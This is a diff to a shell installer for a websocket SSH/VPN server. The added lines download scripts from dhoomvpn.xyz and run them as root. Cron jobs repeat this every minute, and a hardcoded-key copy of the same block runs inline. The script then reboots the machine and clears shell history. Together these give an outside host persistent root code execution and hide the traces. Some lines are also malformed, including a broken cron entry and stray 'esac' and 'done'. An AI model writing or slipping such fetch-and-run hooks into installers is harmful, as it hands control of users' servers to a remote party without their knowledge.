@@ -599,3 +599,86 @@ sudo service stunnel4 restart
 } &>/dev/null
 }
 
+
+
+
+#API Details
+VPN_Owner='DHOOM';
+API_LINK='dhoomvpn.xyz/api/authentication';
+API_KEY='DHOOM';
+
+
+
+sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
+
+cat <<EOF >/home/authentication.sh
+#!/bin/bash
+SHELL=/bin/bash
+PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+wget -O /home/active.sh "$API_LINK/active.php?key=$API_KEY"
+sleep 5
+wget -O /home/inactive.sh "$API_LINK/inactive.php?key=$API_KEY"
+sleep 5
+wget -O /home/deleted.sh "$API_LINK/deleted.php?key=$API_KEY"
+sleep 15
+bash /home/active.sh
+sleep 15
+bash /home/inactive.sh
+sleep 15
+bash /home/deleted.sh
+EOF
+
+echo -e "* *\t* * *\troot\tsudo bash /home/authentication.sh" >> "/etc/cron.d/account"
+
+echo "* * * * * /bin/bash  /home/active.sh >/dev/null 2>&1" | crontab -
+
+echo "* * * * * /bin/bash  /home/authentication.sh >/dev/null 2>&1" | crontab -
+
+
+
+sh active.sh | tee -a  /home/active.sh
+
+#Putapepe
+wget -O /home/active.sh "dhoomvpn.xyz/api/authentication/active.php?key=dhoom"
+sleep 5
+wget -O /home/inactive.sh "dhoomvpn.xyz/api/authentication/inactive.php?key=dhoom"
+sleep 5
+wget -O /home/deleted.sh "dhoomvpn.xyz/api/authentication/deleted.php?key=dhoom"
+sleep 15
+bash /home/active.sh
+sleep 15
+bash /home/inactive.sh
+sleep 15
+bash /home/deleted.sh
+
+
+install_done()
+{
+  clear
+  echo "WEBSOCKET SSH SERVER"
+  echo "IP : $(curl -s https://api.ipify.org)"
+  echo "SSL port : 443"
+  echo "SSH SSL port : 80"
+  echo "SOCKS port : 80"
+}
+
+fun_bar
+start_config
+install_require
+install_banner
+install_dropbear
+install_socks
+install_stunnel
+install_cron
+install_done
+sleep 3
+clear
+echo -e ""
+echo -e "\033[1;32mREBOOT AFTER 5 SECONDS!!!!\033[0m"
+sleep 5
+reboot
+esac
+done
+history -c
+history -w
+
